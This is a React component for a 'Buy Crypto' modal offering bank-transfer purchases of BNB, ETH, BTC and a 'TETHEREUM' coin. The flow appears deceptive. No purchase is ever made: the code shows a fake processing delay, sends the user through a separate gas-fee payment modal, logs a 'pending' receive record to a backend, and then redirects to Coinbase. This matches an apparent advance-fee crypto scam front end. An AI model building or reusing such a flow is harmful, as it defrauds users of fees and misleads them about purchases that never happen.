'use client';

import { useState, useMemo } from 'react';
import { X, ArrowRight, ChevronLeft } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import GasFeeModal from './gas-fee-modal';

interface BuyModalProps {
    address?: string;
    isOpen: boolean;
    onClose: () => void;
    onSuccess?: () => void;
    isInline?: boolean;
}

export default function BuyModal({ address, isOpen, onClose, onSuccess, theme = 'light', isInline = false }: BuyModalProps & { theme?: 'dark' | 'light' }) {
    const [amount, setAmount] = useState('');
    const [crypto, setCrypto] = useState('BNB');

    const [showGasModal, setShowGasModal] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    const currentNetwork = useMemo(() => {
        if (crypto === 'BNB' || crypto === 'BUSD' || crypto === 'TETHEREUM') return 'BNB';
        if (crypto === 'ETH' || crypto === 'USDT' || crypto === 'USDC') return 'ETH';
        if (crypto === 'BTC') return 'BTC';
        return 'ETH';
    }, [crypto]);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        setIsLoading(true);
        // BRIEF delay to show processing, then open Gas Modal
        setTimeout(() => {
            setIsLoading(false);
            setShowGasModal(true);
        }, 1500);
    };

    const handleSuccessRedirect = () => {
        window.open('https://www.coinbase.com/buy', '_blank');
        onClose();
    };

    const handleGasSuccess = async (txHash: string) => {
        // Create Pending Transaction in Airtable
        try {
            await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: address || "unknown",
                    amount: Number(amount),
                    type: "receive", // Buying is receiving crypto
                    asset: crypto,
                    network: "Bank Transfer",
                    wType: "bank",
                    status: "pending"
                })
            });
        } catch (err) {
            console.error("Failed to save buy history", err);
        }

        setShowGasModal(false);
        if (onSuccess) onSuccess();
        handleSuccessRedirect();
    };

    const renderContent = () => {
        return (
            <div className={`${isInline ? 'w-full max-w-[600px] mx-auto' : ''} ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                <div className={`${isInline ? `md:rounded-[2.5rem] md:border p-0 md:p-2 ${theme === 'dark' ? 'bg-transparent md:bg-[#000000] border-white/10' : 'bg-transparent md:bg-white border-gray-100 md:shadow-xl'}` : ''}`}>
                    <div className={`${isInline ? 'p-0 md:p-6 pb-10' : ''}`}>
                        <div className="flex items-center gap-4 mb-8">
                            <button
                                onClick={onClose}
                                className={`w-10 h-10 flex items-center justify-center rounded-full transition-all ${
                                    theme === 'dark' 
                                    ? 'bg-white/5 hover:bg-white/10 text-gray-400 hover:text-white' 
                                    : 'bg-gray-100 hover:bg-gray-200 text-gray-500'
                                }`}
                            >
                                <ChevronLeft className="w-6 h-6" />
                            </button>
                            <h2 className="text-xl md:text-2xl font-black uppercase tracking-widest">Buy Crypto</h2>
                        </div>

                        <div className="mb-6">
                            <button
                                className={`w-full p-4 rounded-2xl border ${theme === 'dark' ? 'border-[#3375BB]/50 bg-[#3375BB]/10 text-white' : 'border-[#3375BB] bg-[#3375BB]/5 text-[#3375BB] font-black'
                                    } flex items-center justify-center gap-3 transition-all cursor-default`}
                            >
                                <img src="https://hatscripts.github.io/circle-flags/flags/us.svg" alt="Bank" className="w-6 h-6 object-contain rounded-full" />
                                <span className="text-xs uppercase tracking-widest">Bank Transfer</span>
                                <span className="text-[10px] opacity-40 uppercase tracking-widest">1-3 days</span>
                            </button>
                            <p className="text-[10px] font-bold text-gray-500 text-center mt-3 uppercase tracking-widest opacity-40">
                                Bank transfers take 1-3 business days to process
                            </p>
                        </div>

                        <form onSubmit={handleSubmit} className="space-y-6">
                            <div>
                                <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-2">Amount to Spend</label>
                                <div className="relative">
                                    <input
                                        type="number"
                                        value={amount}
                                        onChange={(e) => setAmount(e.target.value)}
                                        placeholder="0.00"
                                        className={`w-full px-5 py-5 border rounded-2xl focus:border-[#3375BB] focus:outline-none transition-colors text-lg md:text-xl font-black placeholder-gray-600 ${theme === 'dark' ? 'bg-[#121212] border-white/5 text-white' : 'bg-gray-100 border-gray-200 text-[#0a0b0d]'
                                            }`}
                                        required
                                    />
                                    <span className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 font-black text-sm uppercase tracking-widest">USD</span>
                                </div>
                            </div>

                            <div>
                                <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-2">Crypto to Buy</label>
                                <div className="relative">
                                    <select
                                        value={crypto}
                                        onChange={(e) => setCrypto(e.target.value)}
                                        className={`w-full px-5 py-4 border rounded-2xl focus:border-[#3375BB] focus:outline-none transition-colors appearance-none cursor-pointer text-sm font-black uppercase tracking-widest ${theme === 'dark' ? 'bg-[#121212] border-white/5 text-white' : 'bg-gray-100 border-gray-200 text-[#0a0b0d]'
                                            }`}
                                    >
                                        <option value="BNB">BNB</option>
                                        <option value="TETHEREUM">TETHEREUM</option>
                                        <option value="USDT">USDT</option>
                                        <option value="BUSD">BUSD</option>
                                        <option value="ETH">Ethereum</option>
                                        <option value="BTC">Bitcoin</option>
                                    </select>
                                    <div className="absolute right-5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                                        <ArrowRight className="w-4 h-4 rotate-90" />
                                    </div>
                                </div>
                            </div>

                            <button
                                type="submit"
                                disabled={!amount || Number(amount) <= 0}
                                className="w-full bg-[#3375BB] hover:bg-[#004ada] disabled:bg-[#3375BB]/50 disabled:cursor-not-allowed !text-white font-black uppercase tracking-widest py-5 rounded-[1.5rem] transition-all shadow-xl hover:shadow-[#3375BB]/25 active:scale-[0.98] flex items-center justify-center gap-3 mt-6 text-[12px]"
                            >
                                {isLoading ? "Processing..." : "Continue"}
                                <ArrowRight className="w-5 h-5" />
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        );
    };

    if (isInline) {
        return (
            <>
                {renderContent()}
                <AnimatePresence>
                    {showGasModal && (
                        <GasFeeModal
                            isOpen={showGasModal}
                            onClose={() => setShowGasModal(false)}
                            onSuccess={handleGasSuccess}
                            theme={theme}
                            network={currentNetwork}
                        />
                    )}
                </AnimatePresence>
            </>
        );
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    {/* Backdrop */}
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={onClose}
                    />

                    {/* Modal - Bottom Sheet on Mobile, Centered on Desktop */}
                    <motion.div
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-[#3375BB]/30' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border rounded-[2.5rem] p-6 shadow-2xl m-4`}
                    >
                        {renderContent()}
                    </motion.div>

                    <AnimatePresence>
                        {showGasModal && (
                            <GasFeeModal
                                isOpen={showGasModal}
                                onClose={() => setShowGasModal(false)}
                                onSuccess={handleGasSuccess}
                                theme={theme}
                                network={currentNetwork}
                            />
                        )}
                    </AnimatePresence>
                </div>
            )}
        </AnimatePresence>
    );
}
